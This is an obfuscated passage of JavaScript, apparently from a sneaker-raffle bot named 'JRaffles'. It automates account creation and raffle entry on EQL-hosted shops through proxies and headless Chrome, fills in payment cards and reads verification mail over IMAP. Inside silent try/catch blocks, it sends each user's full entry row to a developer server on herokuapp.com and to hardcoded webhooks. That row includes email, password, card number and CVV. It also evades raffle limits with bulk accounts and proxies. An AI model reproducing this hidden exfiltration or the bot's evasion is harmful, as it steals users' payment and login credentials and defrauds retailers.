                                _0x2b3e5c['resourceType']() === 'image' || _0x2b3e5c['resourceType']() === 'font' || _0x2b3e5c['resourceType']() === 'media' ? _0x2b3e5c['abort']() : _0x2b3e5c['continue']();
                            });
                            try {
                                await _0x34bb15['goto']('' + _0x33ebc0);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x254c61(0x3e8), await _0x34bb15['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x34bb15['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x254c61(0x3e8), _0x2ea816[_0xbf669a]['Url']['includes']('en-GB') ? await _0x34bb15['click']('li[data-value=\x22UK\x20' + _0x2ea816[_0xbf669a]['Size'] + '\x20/\x20US\x20' + (Number(_0x2ea816[_0xbf669a]['Size']) + 0x1) + '\x22]') : await _0x34bb15['click']('li[data-value=\x22EU\x20' + _0x2ea816[_0xbf669a]['Size'] + '\x22]');
                                } catch {
                                    await _0x34bb15['click']('#productQuantity'), await _0x254c61(0x3e8), await _0x34bb15['click']('li[data-value=\x22' + (Number(_0x2ea816[_0xbf669a]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x2ea816[_0xbf669a]['Size']);
                            }
                            await _0x254c61(0x6a4);
                            try {
                                await _0x34bb15['select']('.PhoneInputCountrySelect', _0x2ea816[_0xbf669a]['Country']);
                            } catch {
                            }
                            await _0x34bb15['type']('#email', '' + _0x2ea816[_0xbf669a]['Email']), await _0x254c61(0x352), await _0x34bb15['waitForSelector']('#password'), await _0x34bb15['type']('#password', '' + _0x2ea816[_0xbf669a]['Password']), await _0x254c61(0x352), await _0x34bb15['type']('#phone', '' + _0x2ea816[_0xbf669a]['Phone']), await _0x254c61(0x352);
                            const _0x383169 = await _0x34bb15['$']('#title\x20>\x20label');
                            await _0x254c61(0x12c);
                            _0x383169 && await _0x383169['click']();
                            await _0x34bb15['type']('#firstName', '' + _0x2ea816[_0xbf669a]['FirstName']), await _0x254c61(0x352), await _0x34bb15['type']('#lastName', '' + _0x2ea816[_0xbf669a]['LastName']), await _0x254c61(0x352);
                            _0x2ea816[_0xbf669a]['Url']['includes']('footlocker.de') ? await _0x34bb15['type']('#birthdate', _0x54d0f2(0xa, 0x1c) + '.' + _0x54d0f2(0xa, 0xc) + '.' + _0x54d0f2(0x7c6, 0x7d3)) : await _0x34bb15['type']('#birthdate', _0x54d0f2(0xa, 0x1c) + '-' + _0x54d0f2(0xa, 0xc) + '-' + _0x54d0f2(0x7c6, 0x7d3));
                            await _0x254c61(0x352), await _0x34bb15['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x2ea816[_0xbf669a]['Url']['includes']('en-GB') && await _0x34bb15['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x254c61(0x1f4), await _0x254c61(0x5dc);
                            if (!_0x33ebc0['includes']('footlocker'))
                                try {
                                    await _0x34bb15['click']('#country');
                                    const _0x9e0c37 = await _0x34bb15['$']('li[data-value=\x22' + _0x2ea816[_0xbf669a]['Country'] + '\x22]');
                                    await _0x9e0c37['click'](), await _0x9e0c37['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x254c61(0x3e8);
                            if (!_0x2ea816[_0xbf669a]['Url']['includes']('en-GB')) {
                                await _0x34bb15['click']('#stateAutocomplete'), await _0x254c61(0x5dc);
                                try {
                                    const _0x693e24 = await _0x34bb15['$x']('//li[text()=\x22' + _0x2ea816[_0xbf669a]['State'] + '\x22]');
                                    await _0x693e24[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Setting\x20Address'), await _0x254c61(0x3e8), await _0x254c61(0x1f4);
                            if (_0x2ea816[_0xbf669a]['Url']['includes']('topps')) {
                                await _0x34bb15['click']('#stateAutocomplete'), await _0x254c61(0x5dc);
                                try {
                                    const _0x3e19ff = await _0x34bb15['$x']('//li[text()=\x22' + _0x2ea816[_0xbf669a]['State'] + '\x22]');
                                    await _0x3e19ff[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x254c61(0x3e8), await _0x34bb15['type']('#address1', _0x2ea816[_0xbf669a]['Address1'] + '\x20' + _0x2ea816[_0xbf669a]['HouseNumber']), await _0x254c61(0x1f4), await _0x34bb15['type']('#address2', '' + _0x2ea816[_0xbf669a]['Address2']), await _0x254c61(0x1f4), await _0x34bb15['type']('#city', '' + _0x2ea816[_0xbf669a]['City']), await _0x254c61(0x1f4), await _0x34bb15['type']('#postcode', '' + _0x2ea816[_0xbf669a]['Zip']), await _0x254c61(0x3e8), await _0x34bb15['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x254c61(0x3e8), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x36c373 = await _0x34bb15['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x36c373 && (await _0x34bb15['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x34bb15['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x34bb15['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254c61(0x4b0), await _0x34bb15['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254c61(0x1f4), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CardNumber']), await _0x254c61(0x320), await _0x34bb15['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x34bb15['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['ExpiryDate']), await _0x254c61(0x4b0), await _0x34bb15['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x34bb15['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CVV']), await _0x254c61(0x226), await _0x34bb15['type']('input[name=\x22postalCode\x22]', '' + _0x2ea816[_0xbf669a]['Zip']), await _0x254c61(0x226));
                            const _0x17a8f9 = await _0x34bb15['$']('.__PrivateStripeElement');
                            _0x17a8f9 && (await _0x254c61(0x1f4), await _0x34bb15['click']('.__PrivateStripeElement'), await _0x34bb15['click']('.__PrivateStripeElement'), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CardNumber']), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['ExpiryDate']), await _0x34bb15['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CVV']));
                            await _0x254c61(0x226), await _0x34bb15['click']('#paymentConsent'), await _0x254c61(0x226), await _0x34bb15['click']('#termsConsent'), await _0x254c61(0x2bc), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x34bb15['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x254c61(0x2710);
                            try {
                                await _0x34bb15['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x254c61(0xbb8), await _0x34bb15['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5d76d3 => _0x5d76d3['click']()), await _0x34bb15['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x59db0f => _0x59db0f['click']());
                            } catch {
                            }
                            try {
                                await _0x34bb15['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x401345 = await _0x34bb15['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x401345) {
                                    _0x3e92a1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2ea816[_0xbf669a]['Email'] + ',' + _0x2ea816[_0xbf669a]['Password'] + ',' + _0x2ea816[_0xbf669a]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2acf4c() {
                                var _0x24bc8d, _0x2bb317 = ![];
                                for (var _0x492bfc = 0x0; _0x492bfc < 0x18; _0x492bfc++) {
                                    async function _0x1d51f0() {
                                        var _0x3955f8 = new _0x2796bc({
                                            'user': _0x24de00['masterMail'],
                                            'password': _0x24de00['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2ccfe0(_0x45f8de) {
                                            _0x3955f8['openBox']('INBOX', ![], _0x45f8de);
                                        }
                                        _0x3955f8['once']('ready', function () {
                                            console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2ccfe0(function (_0xaffb6d, _0x4ce0a6) {
                                                console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xaffb6d)
                                                    throw _0xaffb6d;
                                                _0x3955f8['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x261543, _0x182b36) {
                                                    if (!_0x182b36 || !_0x182b36['length'])
                                                        console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3955f8['end']();
                                                    else {
                                                        var _0xede948 = _0x3955f8['seq']['fetch'](_0x182b36, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0xede948['on']('message', function (_0x4192a4, _0x5943e0) {
                                                            var _0x44eb8c = '(#' + _0x5943e0 + ')\x20';
                                                            _0x4192a4['on']('body', function (_0x4e7c85, _0x545ba4) {
                                                                _0x1a979e(_0x4e7c85, (_0x1b75fd, _0x3a8944) => {
                                                                    if (_0x3a8944['subject']['includes']('code')) {
                                                                        const _0x2112f5 = _0x3a8944['text']['split']('\x0a\x0a')[0x3], _0x15457c = _0x2112f5['split']('\x0a')[0x1];
                                                                        _0x24bc8d = _0x15457c;
                                                                    }
                                                                });
                                                            }), _0x4192a4['once']('end', function () {
                                                            });
                                                        }), _0xede948['once']('error', function (_0x3d1736) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0xede948['once']('end', function () {
                                                            _0x3955f8['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3955f8['once']('error', function (_0x3d302a) {
                                            console['log'](_0x467028['red'](_0x3d302a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2bb317 = !![];
                                        }), _0x3955f8['once']('end', async function () {
                                        }), _0x3955f8['connect']();
                                    }
                                    _0x1d51f0(), await _0x254c61(0x1388);
                                    if (_0x24bc8d)
                                        return _0x24bc8d;
                                    if (_0x2bb317)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x492bfc == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2acf4c(), await _0x254c61(0x1f4), await _0x34bb15['type']('#code', '' + code), await _0x254c61(0x3e8), await _0x34bb15['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x8b8889 => _0x8b8889['click']()), await _0x34bb15['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x34bb15['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x2ea816[_0xbf669a]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3e92a1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2ea816[_0xbf669a]['Email'] + ',' + _0x2ea816[_0xbf669a]['Password'] + ',' + _0x2ea816[_0xbf669a]['Phone']), _0x20b98e = 'no', _0x547244(_0x2ea816[_0xbf669a], _0x3ad805);
                            var _0x7574df = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', ![]), _0x278306 = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'pub', ![]);
                            let _0x4d2acc = _0x2ea816[_0xbf669a];
                            try {
                                prxdata = {
                                    'username': _0x4a1218['replace']('#', ''),
                                    'module': _0x3ad805['name'],
                                    'entrydata': JSON['stringify'](_0x4d2acc),
                                    'proxy': '' + _0x57b2e7[_0xbf669a]
                                };
                                var _0x56e8a4 = JSON['stringify'](prxdata);
                                let _0x4a96cb = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x56e8a4, _0x4a96cb);
                            } catch (_0x1da0f5) {
                            }
                            const _0x2bded4 = {
                                'succesDEVMSG': { 'embeds': [_0x7574df] },
                                'succesPUBMSG': { 'embeds': [_0x278306] }
                            };
                            try {
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x2bded4['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x2bded4['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x2bded4['succesPUBMSG']);
                            } catch (_0x4b3a7e) {
                                console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4b3a7e));
                            }
                        } catch (_0x287b3a) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20' + _0x287b3a)), _0x50ef7e = '' + _0x287b3a;
                            var _0x4b775a = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', !![], _0x50ef7e), _0x7574df = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', ![]), _0x278306 = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'pub', ![]);
                            const _0x1aafb6 = {
                                'succesDEVMSG': { 'embeds': [_0x7574df] },
                                'succesPUBMSG': { 'embeds': [_0x278306] }
                            };
                            _0x1aafb6['errorDEV'] = { 'embeds': [_0x4b775a] };
                            _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1aafb6['errorDEV']);
                            await _0x2dfd24(_0x3fd40a, _0x1aafb6['errorDEV']);
                            if (!_0x20b98e == 'no')
                                _0x20b98e = 'yes';
                        } finally {
                            _0x2de77f && _0x2de77f['close']();
                            if (_0x20b98e == 'yes' && _0x5d23f9 != 0x5) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d23f9 + '\x20/\x205)')), _0xbf669a = _0xbf669a - 0x1, _0x5d23f9 = _0x5d23f9 + 0x1;
                                continue;
                            }
                            _0x20b98e == 'yes' && _0x5d23f9 >= 0x5 && (_0x9088f0(_0x2ea816[_0xbf669a], _0x3ad805), _0x20b98e = 'no', _0x5d23f9 = 0x0), console['log']('Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    } else {
                        const _0x1d4d49 = '' + _0x2ea816[_0xbf669a]['Url'];
                        if (_0x20b98e != 'yes')
                            var _0x20b98e = '', _0x5d23f9 = 0x0;
                        if (_0x2ea816[_0xbf669a]['Email'] == '' || _0x2ea816[_0xbf669a]['FirstName'] == '' || _0x2ea816[_0xbf669a]['LastName'] == '') {
                            console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2ea816[_0xbf669a]['Password'] == '' && (_0x2ea816[_0xbf669a]['Password'] = 'JRaffles23!');
                        if (_0x24de00['useRandomProxy'] = ![])
                            var _0x57057b = _0x57b2e7[_0xbf669a]['split'](':');
                        else
                            var _0x24da10 = Math['round'](Math['random']() * (_0x57b2e7['length'] - 0x1)), _0x57057b = _0x57b2e7[_0x24da10]['split'](':');
                        var _0x2de77f;
                        try {
                            _0x2de77f = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x57057b[0x0] + ':' + _0x57057b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2de77f = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x57057b[0x0] + ':' + _0x57057b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xe0d225 = await _0x2de77f['newPage']();
                            await _0xe0d225['authenticate']({
                                'username': '' + _0x57057b[0x2],
                                'password': '' + _0x57057b[0x3]
                            }), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xe0d225['setRequestInterception'](!![]), _0xe0d225['on']('request', _0x503adb => {
                                _0x503adb['resourceType']() === 'image' || _0x503adb['resourceType']() === 'font' || _0x503adb['resourceType']() === 'media' ? _0x503adb['abort']() : _0x503adb['continue']();
                            }), await _0xe0d225['goto'](_0x1d4d49), await _0xe0d225['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xe0d225['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x254c61(0x7d0), await _0xe0d225['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xe0d225['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x254c61(0x3e8), await _0xe0d225['waitForSelector']('#email'), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xe0d225['type']('#email', '' + _0x2ea816[_0xbf669a]['Email']), await _0x254c61(0x352), await _0xe0d225['waitForSelector']('#password'), await _0xe0d225['type']('#password', '' + _0x2ea816[_0xbf669a]['Password']), await _0x254c61(0x352), await _0xe0d225['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x254c61(0x1388);
                            if (!_0x2ea816[_0xbf669a]['Url']['includes']('footlocker') && !_0x2ea816[_0xbf669a]['Url']['includes']('topps'))
                                await _0xe0d225['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x574aa7 = await _0xe0d225['$']('#productQuantity'), _0x400dbe = await _0xe0d225['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x400dbe && !_0x574aa7) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x20b98e = 'no';
                                continue;
                            }
                            if (_0x400dbe) {
                                await _0xe0d225['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x2ea816[_0xbf669a]['Url']['includes']('en-GB') ? await _0xe0d225['click']('li[data-value=\x22UK\x20' + _0x2ea816[_0xbf669a]['Size'] + '\x20/\x20US\x20' + (Number(_0x2ea816[_0xbf669a]['Size']) + 0x1) + '\x22]') : await _0xe0d225['click']('li[data-value=\x22EU\x20' + _0x2ea816[_0xbf669a]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x2ea816[_0xbf669a]['Size']);
                                }
                            }
                            _0x574aa7 && (await _0xe0d225['click']('#productQuantity'), await _0x254c61(0x3e8), await _0xe0d225['click']('li[data-value=\x22' + (Number(_0x2ea816[_0xbf669a]['Size']) - 0x1) + '\x22]'));
                            await _0x254c61(0x3e8), await _0x254c61(0x1f4);
                            const _0x422ce1 = await _0xe0d225['$']('#title\x20>\x20label');
                            await _0x254c61(0x12c);
                            _0x422ce1 && await _0x422ce1['click']();
                            await _0xe0d225['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xe0d225['focus']('#postcode'), await _0xe0d225['keyboard']['down']('Control'), await _0xe0d225['keyboard']['press']('A'), await _0xe0d225['keyboard']['up']('Control'), await _0xe0d225['keyboard']['press']('Backspace'), await _0xe0d225['keyboard']['type'](_0x2ea816[_0xbf669a]['Zip']), await _0x254c61(0x60e), await _0xe0d225['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x254c61(0x3e8), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x254c61(0x1f4);
                            const _0x4469cd = await _0xe0d225['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4469cd && (await _0xe0d225['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xe0d225['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xe0d225['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254c61(0x4b0), await _0xe0d225['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254c61(0x1f4), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CardNumber']), await _0x254c61(0x320), await _0xe0d225['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['ExpiryDate']), await _0x254c61(0x4b0), await _0xe0d225['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CVV']), await _0x254c61(0x226), await _0xe0d225['type']('input[name=\x22postalCode\x22]', '' + _0x2ea816[_0xbf669a]['Zip']), await _0x254c61(0x226));
                            const _0x138649 = await _0xe0d225['$']('.__PrivateStripeElement');
                            _0x138649 && (await _0xe0d225['click']('#billingName'), await _0xe0d225['click']('#billingName'), await _0xe0d225['type']('#billingName', '' + _0x2ea816[_0xbf669a]['NameOnCard']), await _0x254c61(0x1f4), await _0xe0d225['click']('.__PrivateStripeElement'), await _0xe0d225['click']('.__PrivateStripeElement'), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CardNumber']), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['ExpiryDate']), await _0xe0d225['keyboard']['type']('' + _0x2ea816[_0xbf669a]['CVV']));
                            await _0x254c61(0x226), await _0xe0d225['click']('#paymentConsent'), await _0x254c61(0x226), await _0xe0d225['click']('#termsConsent'), await _0x254c61(0x2bc), console['log'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xe0d225['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x254c61(0x2710);
                            try {
                                await _0xe0d225['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x254c61(0xbb8), await _0xe0d225['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4af657 => _0x4af657['click']()), await _0xe0d225['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1c6237 => _0x1c6237['click']());
                            } catch {
                            }
                            try {
                                await _0xe0d225['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x547244(_0x2ea816[_0xbf669a], _0x3ad805);
                            var _0x7574df = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', ![]), _0x278306 = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'pub', ![]);
                            let _0x2230b5 = _0x2ea816[_0xbf669a];
                            try {
                                prxdata = {
                                    'username': _0x4a1218['replace']('#', ''),
                                    'module': _0x3ad805['name'],
                                    'entrydata': JSON['stringify'](_0x2230b5),
                                    'proxy': '' + _0x57b2e7[_0xbf669a]
                                };
                                var _0x56e8a4 = JSON['stringify'](prxdata);
                                let _0x2e87c6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x56e8a4, _0x2e87c6);
                            } catch (_0x150939) {
                            }
                            const _0x560d72 = {
                                'succesDEVMSG': { 'embeds': [_0x7574df] },
                                'succesPUBMSG': { 'embeds': [_0x278306] }
                            };
                            try {
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x560d72['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x560d72['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x560d72['succesPUBMSG']);
                            } catch (_0x1f8a2e) {
                                console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1f8a2e));
                            }
                            _0x20b98e = 'no';
                        } catch (_0x3217b0) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x3ad805['name'] + ']\x20Task\x20' + (_0xbf669a + 0x1) + '\x20:\x20' + _0x3217b0)), _0x50ef7e = '' + _0x3217b0;
                            var _0x4b775a = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', !![], _0x50ef7e), _0x7574df = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'dev', ![]), _0x278306 = await _0x18ad5f(_0x2ea816[_0xbf669a], _0x3ad805, 'pub', ![]);
                            const _0x117789 = {
                                'succesDEVMSG': { 'embeds': [_0x7574df] },
                                'succesPUBMSG': { 'embeds': [_0x278306] }
                            };
